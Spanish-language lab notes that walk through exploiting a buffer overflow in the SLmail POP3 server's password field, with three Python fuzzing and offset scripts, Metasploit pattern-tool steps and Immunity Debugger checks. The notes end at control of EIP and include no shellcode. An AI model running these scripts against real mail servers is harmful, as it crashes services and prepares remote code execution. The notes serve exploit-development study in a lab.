En la fase inicial de explotación de un buffer overflow, una de las primeras tareas es averiguar los límites del programa objetivo. Esto se hace probando a introducir más caracteres de los debidos en diferentes campos de entrada del programa, como una cadena de texto o un archivo, hasta que se detecte que la aplicación se corrompe o falla.

Como ejemplo lo trataremos de llevar acabo con SLmail el cual ya ha sido configurado anteriormente


 Primero lo que tenemos que hacer es sincronizarnos al proceso de SLmail con ayuda de immunity debugger para asi ver los registros y las cosas en bajo nivel para eso ya con el immunity debugger abierto presionamos ctrl + f1 y nos abrira una ventana en esta seleccionamos el proceso que queremos analizar en este caso SLmail y le damos click al boton de Attach

![[Pasted image 20240307200039.png]]

Y ahora veremos lo siguiente 

![[Pasted image 20240308082824.png]]

Cuando hacemos esto por defecto el proceso se pausa asi que solo lo que tenemos que hace es darle al boton de play para que sigua corriendo

![[Pasted image 20240308083005.png]]


Al buscar mas informacion sobre el servicio de Slmail en searchsploit podemos ver que al parecer el campo de la contraseña es vulnerable a buffer overflow 

![[Pasted image 20240308084221.png]]

Entoces ya sabiendo cual es el campo vulnerable vamos a fuzzear para ver cuantos bytes tenemos que enviar para que la aplicacion deje de funcionar como sabremos que la aplicacion deja de funcionar pues por que en la seccion de registros del immunity manager apareceran registros y el procesos se pausara en la siguiente imagen se muestra donde tenemos que poner atencion 


![[Pasted image 20240308090431.png]]

Para fuzzear el servicio nos ayudaremos del siguiente exploit hecho en python


```python
#!/usr/bin/python3.11
import sys
import socket

if len(sys.argv) != 2:

    print("\n[+] Uso: ./exploit_bof.py <longitud>")

    exit()

ip = "192.168.0.2"
port = 110
total_length = int(sys.argv[1])


def exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip, port))

    banner = s.recv(1024)

    s.send(b"USER tumbaburras" + b'\r\n')
    response = s.recv(1024)

    s.send(b"PASS" + b"A" * total_length + b'\r\n')


    s.close

if __name__ == '__main__':

    exploit()




```


Lo que hace este exploit es que intenta provocar un desbordamiento de búfer enviando una contraseña especialmente formateada al servidor POP3.

Ahora lo que tendremos que hacer es ejecutarlo y ver como se comporta el procesos en cuestion entonces lo ejecutamos de la siguiente manera en este caso le mandaremos 200 bytes

![[Pasted image 20240308094837.png]]

Al verificar en immunity debugger como siguie el proceso vemos que esto no ha sido suficiente por lo que no a crasheado 

![[Pasted image 20240308095025.png]]

Ya que esto no ha sido sufiente para detenerlo  mandaremos mas bytes por ejemplo 5000 


![[Pasted image 20240308095403.png]]

Ahora al regresar al immuntity debugger podemos ver que el proceso esta pausado y el EIP ahora apunta a 4 as en hexadecimal lo cual corresponde al padding que hemos especificado en el exploit 

![[Pasted image 20240308095900.png]]


Viendo que se acontece un buffer overflow ahora lo que tenemos que tratar de saber es cuantas aes tenemos que introducir hasta antes de sobrescribir el EIP para eso podemos utilizar una utilidad de metasploit la cual es la siguiente


![[Pasted image 20240308102432.png]]

Con esta podemos crear patrones con una longitud especifica los cuales luego con otra utlidad de metasploit nos permite encontrar el offset del programa 

Entonces lo siguiente que tenemos que hacer es cerrar el slmail y el immunity debugger ya que el servicio ha sido corropido y luego volvemos a inicar el slmail  junto con el immunity debugger y hacemos los pasos que hicimios al principio luego ejecutamos la utlidad de metasploit y le indicamos que queremos crear un patron de 5000 bytes como se muestra a continuacion 


![[Pasted image 20240308103320.png]]

El patron que nos arroja lo copiamos ya que con este modificaremos el exploit de la siguiente manera


```python 
#!/usr/bin/python3.11
import sys
import socket


ip = "192.168.0.2"
port = 110

payload=b""


def exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip, port))

    banner = s.recv(1024)

    s.send(b"USER tumbaburras" + b'\r\n')
    response = s.recv(1024)

    s.send(b"PASS" + payload + b'\r\n')


    s.close

if __name__ == '__main__':

    exploit()




```


Ya con exploit modificado lo podemos ejecutar


![[Pasted image 20240308104626.png]]


Ya ejecutado si nos vamos al immunity debugger vemos que el proceso se ha pausado y el EIP se ha sobrescrito lo que tenemos que hacer ahora es copiar el el valor que tiene el eip 


![[Pasted image 20240308104750.png]]


Entonces usando la siguiente herramienta de metasploit le pasamos el valor que tenia el EIP y nos regresara el offset  como se muestra a continacion 

![[Pasted image 20240308105141.png]]

Ya sabiendo el offset podemos modificar el exploit para asi tratar de controlar el EIP la modificacion seria la siguiente


```python
#!/usr/bin/python3.11
import sys
import socket

ip = "192.168.0.2"
port = 110


offset=4655

before_eip=b"A"*offset

eip=b"B"*4

payload=before_eip+eip

def exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip, port))

    banner = s.recv(1024)

    s.send(b"USER tumbaburras" + b'\r\n')
    response = s.recv(1024)

    s.send(b"PASS" + payload + b'\r\n')


    s.close

if __name__ == '__main__':

    exploit()




```


Antes de ejecutar el exploit tenemos que reiniciar nuevamente el immunity debugger y el slmail ya que este ha crasheado ya reniciado todo ahora solo queda ejecutar el exploit 

![[Pasted image 20240308114536.png]]

Ahora si verificamos el immunity debugger podemos ver que el EIP es el mismo que indicamos desde el exploit (4 bes) solo que en este caso se muestra en hexadecimal 


![[Pasted image 20240308114729.png]]

Y listo asi de facil tenemos el control del registro EIP

